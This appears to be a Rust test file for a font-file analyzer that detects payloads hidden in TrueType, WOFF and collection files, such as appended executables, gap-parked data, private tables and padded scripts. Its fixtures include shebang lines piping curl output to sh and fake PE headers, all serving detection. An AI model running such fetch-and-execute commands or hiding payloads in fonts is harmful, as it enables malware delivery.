use super::*;

fn run(bytes: &[u8]) -> (Values, Metrics) {
    let mut v = Values::new();
    let mut s = Strings::default();
    let mut m = Metrics::new();
    extract(bytes, &mut v, &mut s, &mut m);
    (v, m)
}

fn format_of(v: &Values) -> String {
    v.get("font.format")
        .and_then(|x| x.as_str())
        .unwrap_or_default()
        .to_string()
}

fn features(v: &Values) -> Vec<String> {
    v.get("font.features")
        .and_then(|x| x.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// Build a minimal but well-formed sfnt: header, directory, then each
/// table's bytes laid end to end immediately after the directory.
fn build_sfnt(version: [u8; 4], tables: &[(&[u8; 4], &[u8])]) -> Vec<u8> {
    build_sfnt_at(0, version, tables)
}

/// Same, for an sfnt that will be embedded at `base` inside a larger file.
/// sfnt table offsets are absolute from the start of the *file*, not the
/// directory, so a collection member has to be built knowing where it lands.
fn build_sfnt_at(base: usize, version: [u8; 4], tables: &[(&[u8; 4], &[u8])]) -> Vec<u8> {
    let dir_end = base + 12 + tables.len() * SFNT_RECORD_LEN;
    let mut header = Vec::new();
    header.extend_from_slice(&version);
    header.extend_from_slice(&(tables.len() as u16).to_be_bytes());
    header.extend_from_slice(&[0; 6]); // searchRange/entrySelector/rangeShift

    let mut dir = Vec::new();
    let mut body = Vec::new();
    let mut offset = dir_end;
    for (tag, data) in tables {
        dir.extend_from_slice(*tag);
        dir.extend_from_slice(&[0; 4]); // checksum (unchecked)
        dir.extend_from_slice(&(offset as u32).to_be_bytes());
        dir.extend_from_slice(&(data.len() as u32).to_be_bytes());
        body.extend_from_slice(data);
        offset += data.len();
    }

    let mut out = header;
    out.extend_from_slice(&dir);
    out.extend_from_slice(&body);
    out
}

#[test]
fn valid_truetype_is_valid() {
    let font = build_sfnt(
        [0x00, 0x01, 0x00, 0x00],
        &[(b"head", &[0u8; 54]), (b"cmap", &[0u8; 32])],
    );
    let (v, m) = run(&font);
    assert_eq!(format_of(&v), "truetype");
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    assert_eq!(m.get("font.table_count"), Some(2.0));
    assert_eq!(m.get("font.trailing_bytes"), Some(0.0));
    assert_eq!(m.get("font.gap_bytes"), Some(0.0));
    assert_eq!(m.get("font.unknown_table_count"), Some(0.0));
    assert_eq!(
        v.get("font.sfnt_version").and_then(|x| x.as_str()),
        Some("1.0")
    );
}

#[test]
fn otto_is_opentype() {
    let font = build_sfnt(*b"OTTO", &[(b"CFF ", &[0u8; 16])]);
    let (v, _) = run(&font);
    assert_eq!(format_of(&v), "opentype");
}

#[test]
fn appended_payload_is_trailing_data() {
    let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
    font.extend_from_slice(b"-----BEGIN PAYLOAD----- lots of stowaway bytes here");
    let (v, m) = run(&font);
    assert!(features(&v).contains(&"trailing_data".to_string()));
    assert!(m.get("font.trailing_bytes").unwrap() > 40.0);
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
}

/// A gap between two tables is where a payload hides in a font that still
/// renders: no table points at those bytes, so nothing reads them.
#[test]
fn interior_gap_is_reported() {
    // Hand-build a directory whose second table starts 64 bytes late.
    let dir_end = 12 + 2 * SFNT_RECORD_LEN;
    let mut out = Vec::new();
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&2u16.to_be_bytes());
    out.extend_from_slice(&[0; 6]);
    let first_len = 16u32;
    let gap = 64u32;
    let second_off = dir_end as u32 + first_len + gap;
    for (tag, off, len) in [
        (b"head", dir_end as u32, first_len),
        (b"cmap", second_off, 16u32),
    ] {
        out.extend_from_slice(tag);
        out.extend_from_slice(&[0; 4]);
        out.extend_from_slice(&off.to_be_bytes());
        out.extend_from_slice(&len.to_be_bytes());
    }
    out.resize((second_off + 16) as usize, 0x41);
    let (v, m) = run(&out);
    assert!(features(&v).contains(&"interior_gaps".to_string()));
    assert!(m.get("font.gap_bytes").unwrap() >= 55.0);
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
}

#[test]
fn private_tag_is_unknown() {
    let font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"PWNZ", &[0u8; 8])]);
    let (v, m) = run(&font);
    let unknown = v
        .get("font.unknown_tables")
        .and_then(|x| x.as_array())
        .unwrap();
    assert_eq!(unknown[0].as_str(), Some("PWNZ"));
    assert_eq!(m.get("font.unknown_table_count"), Some(1.0));
    assert_eq!(m.get("font.unknown_table_bytes"), Some(8.0));
    assert!(features(&v).contains(&"unknown_tables".to_string()));
}

#[test]
fn table_past_end_of_file_is_out_of_bounds() {
    let dir_end = 12 + SFNT_RECORD_LEN;
    let mut out = Vec::new();
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&1u16.to_be_bytes());
    out.extend_from_slice(&[0; 6]);
    out.extend_from_slice(b"glyf");
    out.extend_from_slice(&[0; 4]);
    out.extend_from_slice(&(dir_end as u32).to_be_bytes());
    out.extend_from_slice(&0x00FF_FFFFu32.to_be_bytes()); // absurd length
    let (v, _) = run(&out);
    assert!(features(&v).contains(&"table_out_of_bounds".to_string()));
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
}

#[test]
fn woff_header_size_lie_is_reported() {
    let mut out = Vec::new();
    out.extend_from_slice(b"wOFF");
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]); // flavor
    out.extend_from_slice(&64u32.to_be_bytes()); // declared length (short)
    out.extend_from_slice(&0u16.to_be_bytes()); // numTables
    out.extend_from_slice(&[0; 30]);
    out.resize(300, 0x00);
    let (v, m) = run(&out);
    assert_eq!(format_of(&v), "woff");
    assert!(features(&v).contains(&"size_mismatch".to_string()));
    assert!(features(&v).contains(&"trailing_data".to_string()));
    assert!(m.get("font.trailing_bytes").unwrap() > 200.0);
}

#[test]
fn woff2_records_declared_size() {
    let mut out = Vec::new();
    out.extend_from_slice(b"wOF2");
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&200u32.to_be_bytes()); // declared length
    out.extend_from_slice(&3u16.to_be_bytes()); // numTables
    out.extend_from_slice(&[0; 34]);
    out.resize(200, 0x00);
    let (v, m) = run(&out);
    assert_eq!(format_of(&v), "woff2");
    assert_eq!(m.get("font.table_count"), Some(3.0));
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
}

#[test]
fn eot_detected_by_magic_field() {
    let mut out = vec![0u8; 64];
    out[0..4].copy_from_slice(&64u32.to_le_bytes()); // EOTSize == file size
    out[4..8].copy_from_slice(&16u32.to_le_bytes()); // FontDataSize
    out[EOT_MAGIC_OFFSET] = 0x4C;
    out[EOT_MAGIC_OFFSET + 1] = 0x50;
    let (v, _) = run(&out);
    assert_eq!(format_of(&v), "eot");
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
}

/// The case this module exists for: a `.woff2` whose bytes are a
/// whitespace-padded script. No signature, so the format is `none`, the
/// file is invalid, and the text/padding metrics carry the evidence.
#[test]
fn script_wearing_a_font_name_is_invalid_and_texty() {
    let mut payload = " ".repeat(997);
    payload.push_str("function a(){const t=['deadbeef','cafebabe'];return t}a();");
    let (v, m) = run(payload.as_bytes());
    assert_eq!(format_of(&v), "none");
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
    assert!(features(&v).contains(&"text_content".to_string()));
    assert!(m.get("font.printable_ratio").unwrap() > 0.99);
    assert_eq!(m.get("font.leading_whitespace_bytes"), Some(997.0));
    let problems = v.get("font.problems").and_then(|x| x.as_array()).unwrap();
    assert_eq!(problems[0].as_str(), Some("no font signature"));
}

#[test]
fn pe_wearing_a_font_name_is_invalid_but_not_texty() {
    let mut payload = b"MZ\x90\x00\x03\x00\x00\x00".to_vec();
    payload.extend_from_slice(&[0u8; 512]);
    let (v, _) = run(&payload);
    assert_eq!(format_of(&v), "none");
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
    assert!(!features(&v).contains(&"text_content".to_string()));
}

#[test]
fn empty_input_does_not_panic() {
    let (v, m) = run(&[]);
    assert_eq!(format_of(&v), "none");
    assert_eq!(m.get("font.printable_ratio"), Some(0.0));
}

#[test]
fn truncated_sfnt_header_does_not_panic() {
    let (v, _) = run(&[0x00, 0x01, 0x00, 0x00, 0x00]);
    assert!(features(&v).contains(&"truncated".to_string()));
}

#[test]
fn absurd_table_count_is_rejected_without_allocating() {
    let mut out = Vec::new();
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&u16::MAX.to_be_bytes());
    out.extend_from_slice(&[0; 6]);
    let (v, _) = run(&out);
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
}

/// A directory past the table cap is refused outright rather than walked
/// record by record.
#[test]
fn table_count_over_cap_is_implausible() {
    let mut out = Vec::new();
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&((MAX_TABLES + 1) as u16).to_be_bytes());
    out.extend_from_slice(&[0; 6]);
    // A complete directory, so only the count can be what rejects it.
    out.resize(12 + (MAX_TABLES + 1) * SFNT_RECORD_LEN, 0);
    let (v, m) = run(&out);
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
    let problems = v.get("font.problems").and_then(|x| x.as_array()).unwrap();
    assert!(problems.contains(&JsonValue::from("implausible table count")));
    assert_eq!(m.get("font.table_count"), Some(0.0));
}

/// Every member of a collection may point at one directory; it is walked
/// once, and a full-size directory of distinct tags stays distinct.
#[test]
fn collection_members_sharing_one_large_directory() {
    let tags: Vec<[u8; 4]> = (0..MAX_TABLES as u32)
        .map(|i| (i | 0x4141_0000).to_be_bytes())
        .collect();
    let tables: Vec<(&[u8; 4], &[u8])> = tags.iter().map(|t| (t, &[0u8; 4][..])).collect();
    let members = 512usize;
    let base = 12 + members * 4;
    let dir = build_sfnt_at(base, [0x00, 0x01, 0x00, 0x00], &tables);
    let mut out = Vec::new();
    out.extend_from_slice(b"ttcf");
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&(members as u32).to_be_bytes());
    for _ in 0..members {
        out.extend_from_slice(&(base as u32).to_be_bytes());
    }
    out.extend_from_slice(&dir);
    let (v, m) = run(&out);
    assert_eq!(m.get("font.table_count"), Some(MAX_TABLES as f64));
    assert_eq!(m.get("font.unknown_table_count"), Some(MAX_TABLES as f64));
    assert_eq!(m.get("font.gap_bytes"), Some(0.0));
    assert!(!features(&v).contains(&"overlapping_tables".to_string()));
}

#[test]
fn tag_labels_escape_non_printable_bytes() {
    assert_eq!(tag_label(b"OS/2"), "OS/2");
    assert_eq!(tag_label(&[b'a', 0x00, 0x7f, b'b']), "a\\x00\\x7fb");
}

#[test]
fn collection_walks_members() {
    let member = build_sfnt_at(16, [0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 16])]);
    let mut out = Vec::new();
    out.extend_from_slice(b"ttcf");
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&1u32.to_be_bytes()); // numFonts
    out.extend_from_slice(&16u32.to_be_bytes()); // offset of member
    out.extend_from_slice(&member);
    let (v, _) = run(&out);
    assert_eq!(format_of(&v), "truetype_collection");
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    let tables = v.get("font.tables").and_then(|x| x.as_array()).unwrap();
    assert_eq!(tables[0].as_str(), Some("head"));
}

/// Collection members deliberately share table data. Coverage is computed
/// over the union, so a shared table is not reported as an unaccounted-for
/// gap — the regression that marked every shipped macOS `.ttc` invalid.
#[test]
fn collection_members_may_share_tables() {
    let member = build_sfnt_at(20, [0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 32])]);
    let mut out = Vec::new();
    out.extend_from_slice(b"ttcf");
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&2u32.to_be_bytes()); // two members...
    out.extend_from_slice(&20u32.to_be_bytes()); // ...both pointing at the
    out.extend_from_slice(&20u32.to_be_bytes()); //    same directory
    out.extend_from_slice(&member);
    let (v, m) = run(&out);
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    assert_eq!(m.get("font.gap_bytes"), Some(0.0));
    assert_eq!(m.get("font.table_count"), Some(1.0));
}

#[test]
fn dsig_and_fvar_set_feature_flags() {
    let font = build_sfnt(
        [0x00, 0x01, 0x00, 0x00],
        &[(b"DSIG", &[0u8; 8]), (b"fvar", &[0u8; 8])],
    );
    let (v, _) = run(&font);
    let f = features(&v);
    assert!(f.contains(&"signed".to_string()));
    assert!(f.contains(&"variable".to_string()));
}

fn stowaway(v: &Values) -> Vec<String> {
    v.get("font.stowaway")
        .and_then(|x| x.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_str().map(str::to_string))
                .collect()
        })
        .unwrap_or_default()
}

/// A DOS header with a working `e_lfanew`. Two bytes of `MZ` are not
/// enough — see `mz_without_pe_signature_is_not_an_executable`.
fn fake_pe(body: usize) -> Vec<u8> {
    let mut out = vec![0u8; 0x40];
    out[0] = b'M';
    out[1] = b'Z';
    out[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    out.extend_from_slice(b"PE\0\0");
    out.extend(std::iter::repeat_n(0x41u8, body));
    out
}

#[test]
fn appended_executable_is_named_in_stowaway() {
    let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
    font.extend_from_slice(&fake_pe(2048));
    let (v, m) = run(&font);
    assert_eq!(stowaway(&v), vec!["pe"]);
    assert!(m.get("font.stowaway_bytes").unwrap() > 2000.0);
}

/// Payload parked in a gap between two tables: no table points at it, so
/// the font renders and nothing reads the bytes.
#[test]
fn payload_in_an_interior_gap_is_classified() {
    let dir_end = 12 + 2 * SFNT_RECORD_LEN;
    let payload = fake_pe(512);
    let mut out = Vec::new();
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);
    out.extend_from_slice(&2u16.to_be_bytes());
    out.extend_from_slice(&[0; 6]);
    let first_len = 16u32;
    let second_off = dir_end as u32 + first_len + payload.len() as u32;
    for (tag, off, len) in [
        (b"head", dir_end as u32, first_len),
        (b"cmap", second_off, 16u32),
    ] {
        out.extend_from_slice(tag);
        out.extend_from_slice(&[0; 4]);
        out.extend_from_slice(&off.to_be_bytes());
        out.extend_from_slice(&len.to_be_bytes());
    }
    out.resize(dir_end + first_len as usize, 0);
    out.extend_from_slice(&payload);
    out.resize((second_off + 16) as usize, 0);
    let (v, _) = run(&out);
    assert_eq!(stowaway(&v), vec!["pe"]);
}

#[test]
fn archive_and_script_stowaways_are_named() {
    for (payload, want) in [
        (b"PK\x03\x04rest of a zip".as_slice(), "zip"),
        (b"\x1f\x8b\x08gzip stream here".as_slice(), "gzip"),
        (b"#!/bin/sh\ncurl x | sh\n".as_slice(), "shebang"),
    ] {
        let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
        font.extend_from_slice(payload);
        font.extend_from_slice(&[0u8; 300]);
        let (v, _) = run(&font);
        assert!(stowaway(&v).contains(&want.to_string()), "{want}");
    }
}

/// An unregistered tag is where a payload hides inside the directory
/// rather than outside it — the font stays structurally valid.
#[test]
fn payload_in_a_private_table_is_classified() {
    let pe = fake_pe(1024);
    let font = build_sfnt(
        [0x00, 0x01, 0x00, 0x00],
        &[(b"head", &[0u8; 54]), (b"PWNZ", &pe)],
    );
    let (v, _) = run(&font);
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    assert_eq!(stowaway(&v), vec!["pe"]);
}

/// The `name` table legitimately holds readable strings, so text there is
/// not a stowaway — but a shebang or an executable image still is.
#[test]
fn name_table_text_is_expected_but_executables_are_not() {
    let prose = b"Copyright 2026 Example Foundry. All rights reserved. Regular";
    let font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"name", prose)]);
    assert!(stowaway(&run(&font).0).is_empty());

    let script = b"#!/bin/sh\ncurl -fsSL http://x.invalid | sh\n";
    let font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"name", script)]);
    assert_eq!(stowaway(&run(&font).0), vec!["shebang"]);
}

/// `MZ` is two bytes and occurs constantly in glyph outlines. Without a
/// resolvable `PE\0\0` it is not an executable, and treating it as one
/// would fire on ordinary fonts.
#[test]
fn mz_without_pe_signature_is_not_an_executable() {
    let mut noise = vec![0u8; 2048];
    noise[100] = b'M';
    noise[101] = b'Z';
    noise[900] = b'M';
    noise[901] = b'Z';
    let mut font = build_sfnt([0x00, 0x01, 0x00, 0x00], &[(b"head", &[0u8; 54])]);
    font.extend_from_slice(&noise);
    assert!(!stowaway(&run(&font).0).contains(&"pe".to_string()));
}

/// Whitespace padding pushes real magic past every fixed-window content
/// sniffer, so the file reaches the font analyzer instead. Searching the
/// whole file is what recovers the answer.
#[test]
fn padded_executable_is_reported_as_content_kind() {
    let mut payload = b" ".repeat(900);
    payload.extend_from_slice(&fake_pe(4096));
    let (v, _) = run(&payload);
    assert_eq!(
        v.get("font.content_kind").and_then(|x| x.as_str()),
        Some("pe")
    );
}

#[test]
fn opaque_high_entropy_content_is_distinguished_from_text() {
    // Deterministic pseudo-random bytes: high entropy, no signature.
    let mut blob = Vec::new();
    let mut x: u32 = 0x1234_5678;
    while blob.len() < 8192 {
        x = x.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
        blob.extend_from_slice(&x.to_le_bytes());
    }
    let (v, _) = run(&blob);
    assert_eq!(
        v.get("font.content_kind").and_then(|x| x.as_str()),
        Some("high_entropy")
    );
}

/// A `name` table is legitimately claimed content, so its size must not
/// land in `font.stowaway_bytes` — counting it reported several kilobytes
/// of "unaccounted-for" bytes on every ordinary font.
#[test]
fn name_table_bytes_are_not_counted_as_stowaway() {
    let prose = b"Copyright 2026 Example Foundry. Regular. Designed by nobody.";
    let font = build_sfnt(
        [0x00, 0x01, 0x00, 0x00],
        &[(b"head", &[0u8; 54]), (b"name", prose)],
    );
    let (_, m) = run(&font);
    assert_eq!(m.get("font.stowaway_bytes"), Some(0.0));
    assert_eq!(m.get("font.stowaway_entropy"), Some(0.0));
}

#[test]
fn a_clean_font_reports_no_stowaway() {
    let font = build_sfnt(
        [0x00, 0x01, 0x00, 0x00],
        &[(b"head", &[0u8; 54]), (b"cmap", &[0u8; 32])],
    );
    let (v, m) = run(&font);
    assert!(stowaway(&v).is_empty());
    assert_eq!(m.get("font.stowaway_bytes"), Some(0.0));
    assert_eq!(m.get("font.stowaway_entropy"), Some(0.0));
}

/// Deterministic pseudo-random bytes: high entropy, no signature.
fn noise(len: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity(len);
    let mut x: u32 = 0x9e37_79b9;
    while out.len() < len {
        x = x.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
        out.extend_from_slice(&x.to_le_bytes());
    }
    out.truncate(len);
    out
}

/// Build a WOFF laid out as the spec orders it: header, table directory,
/// table data (stored uncompressed, which WOFF permits), then the optional
/// metadata and private-data blocks, each starting on a 4-byte boundary.
/// An empty `meta` or `private` leaves that block undeclared.
fn build_woff(tables: &[(&[u8; 4], &[u8])], meta: &[u8], private: &[u8]) -> Vec<u8> {
    let dir_end = 44 + tables.len() * WOFF_RECORD_LEN;
    let mut dir = Vec::new();
    let mut body = Vec::new();
    for (tag, data) in tables {
        let len = (data.len() as u32).to_be_bytes();
        dir.extend_from_slice(*tag);
        dir.extend_from_slice(&((dir_end + body.len()) as u32).to_be_bytes());
        dir.extend_from_slice(&len); // compLength
        dir.extend_from_slice(&len); // origLength
        dir.extend_from_slice(&[0; 4]); // checksum (unchecked)
        body.extend_from_slice(data);
        body.resize(body.len().next_multiple_of(4), 0);
    }
    let mut block = |data: &[u8]| -> [u8; 8] {
        if data.is_empty() {
            return [0; 8];
        }
        let at = (dir_end + body.len()) as u32;
        body.extend_from_slice(data);
        body.resize(body.len().next_multiple_of(4), 0);
        let mut field = [0; 8];
        field[..4].copy_from_slice(&at.to_be_bytes());
        field[4..].copy_from_slice(&(data.len() as u32).to_be_bytes());
        field
    };
    let meta_field = block(meta);
    let private_field = block(private);

    let mut out = Vec::new();
    out.extend_from_slice(b"wOFF");
    out.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]); // flavor
    out.extend_from_slice(&((dir_end + body.len()) as u32).to_be_bytes()); // length
    out.extend_from_slice(&(tables.len() as u16).to_be_bytes()); // numTables
    out.extend_from_slice(&[0; 2]); // reserved
    out.extend_from_slice(&[0; 4]); // totalSfntSize
    out.extend_from_slice(&[0; 4]); // majorVersion, minorVersion
    out.extend_from_slice(&meta_field); // metaOffset, metaLength
    out.extend_from_slice(&(meta.len() as u32).to_be_bytes()); // metaOrigLength
    out.extend_from_slice(&private_field); // privOffset, privLength
    out.extend_from_slice(&dir);
    out.extend_from_slice(&body);
    out
}

/// The metadata block is declared by the WOFF header, so its bytes are
/// covered. Compressed metadata reads as high-entropy noise; that must not
/// make an ordinary WOFF report a stowaway or unaccounted-for bytes.
#[test]
fn woff_metadata_block_is_covered_not_stowaway() {
    let meta = noise(1024);
    let woff = build_woff(&[(b"head", &[0u8; 54]), (b"cmap", &[0u8; 32])], &meta, &[]);
    let (v, m) = run(&woff);
    assert_eq!(format_of(&v), "woff");
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    assert!(stowaway(&v).is_empty(), "{:?}", stowaway(&v));
    assert!(!features(&v).contains(&"stowaway".to_string()));
    assert_eq!(m.get("font.stowaway_bytes"), Some(0.0));
    assert_eq!(m.get("font.stowaway_entropy"), Some(0.0));
    assert_eq!(m.get("font.gap_bytes"), Some(0.0));
    assert_eq!(m.get("font.trailing_bytes"), Some(0.0));
}

/// Covered is not unexamined. The private block is free-form vendor data,
/// so an executable parked there is still named, as one in `name` is,
/// while its bytes stay out of `font.stowaway_bytes`.
#[test]
fn woff_private_block_is_covered_but_still_scanned() {
    let woff = build_woff(&[(b"head", &[0u8; 54])], &noise(64), &fake_pe(1024));
    let (v, m) = run(&woff);
    assert_eq!(v.get("font.valid").and_then(JsonValue::as_bool), Some(true));
    assert_eq!(stowaway(&v), vec!["pe"]);
    assert_eq!(m.get("font.stowaway_bytes"), Some(0.0));
}

/// A block declared past the end of the file is not covered ground.
#[test]
fn woff_metadata_past_end_of_file_is_out_of_bounds() {
    let mut woff = build_woff(&[(b"head", &[0u8; 54])], &noise(64), &[]);
    woff[28..32].copy_from_slice(&0x00FF_FFFFu32.to_be_bytes()); // metaLength
    let (v, _) = run(&woff);
    assert!(features(&v).contains(&"table_out_of_bounds".to_string()));
    assert_eq!(
        v.get("font.valid").and_then(JsonValue::as_bool),
        Some(false)
    );
}

#[test]
fn non_printable_tag_is_escaped() {
    let font = build_sfnt(
        [0x00, 0x01, 0x00, 0x00],
        &[(&[0x01, 0x02, b'a', b'b'], &[0u8; 4])],
    );
    let (v, _) = run(&font);
    let tables = v.get("font.tables").and_then(|x| x.as_array()).unwrap();
    assert_eq!(tables[0].as_str(), Some("\\x01\\x02ab"));
}
